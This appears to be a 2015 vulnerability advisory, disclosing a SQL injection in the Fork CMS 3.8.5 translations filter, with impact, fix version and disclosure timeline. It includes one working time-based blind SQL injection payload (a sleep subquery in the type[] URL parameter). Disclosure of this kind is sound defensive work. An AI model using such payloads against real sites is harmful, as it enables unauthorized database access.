@@ -1,0 +1,58 @@
+[CVE-2015-1467] Fork CMS - SQL Injection in Version 3.8.5
+
+----------------------------------------------------------------
+
+Product Information:
+
+Software: Fork CMS
+
+Tested Version: 3.8.5, released on Wednesday 14 January 2015
+
+Vulnerability Type: SQL Injection (CWE-89)
+
+Download link to tested version: http://www.fork-cms.com/download?release=3.8.5
+
+Description: Fork CMS is dedicated to creating a user friendly environment to build, monitor and update your website. We take great pride in being the Content Management System of choice for beginners and professionals. We combine this grand vision with the latest technological innovations to allow developers, front-end developers and designers to build kick-ass websites. This makes Fork CMS next in line for world domination. (copied from http://www.fork-cms.com/features)
+
+----------------------------------------------------------------
+
+Vulnerability description:
+
+When an authenticated user is navigating to "Settings/Translations" and is clicking on the button "Update Filter" the following GET-request is sent to the server:
+
+http://127.0.0.1/private/en/locale/index?form=filter&form_token=408d28a8cbab7890c11b20af033c486b&application=&module=&type%5B%5D=act&type%5B%5D=err&type%5B%5D=lbl&type%5B%5D=msg&language%5B%5D=en&name=&value=
+
+
+The parameter language[] is prone to boolean-based blind and stacked queries SQL-Injection. WIth the following payload a delay can be provoked in the request of additional 10 seconds:
+
+http://127.0.0.1/private/en/locale/index?form=filter&form_token=68aa8d273e0bd95a70e67372841603d5&application=&module=&type%5B%5D=act%27%2b(select%20*%20from%20(select(sleep(10)))a)%2b%27&type%5B%5D=err&type%5B%5D=lbl&type%5B%5D=msg&language%5B%5D=en&name=&value=
+
+Also the parameters type[] are prone to SQL-Injection.
+
+----------------------------------------------------------------
+
+Impact: 
+
+Direct database access is possible if an attacker is exploiting the SQL Injection vulnerability.
+
+----------------------------------------------------------------
+
+Solution:
+
+Update to the latest version, which is   3.8.6, see http://www.fork-cms.com/download.
+
+----------------------------------------------------------------
+
+Timeline:
+
+Vulnerability found: 3.2.2015
+Vendor informed: 3.2.2015
+Response by vendor: 3.2.2015
+Fix by vendor 3.2.2015
+Public Advisory: 4.2.2015
+
+----------------------------------------------------------------
+
+Best regards,
+
+Sven Schleier
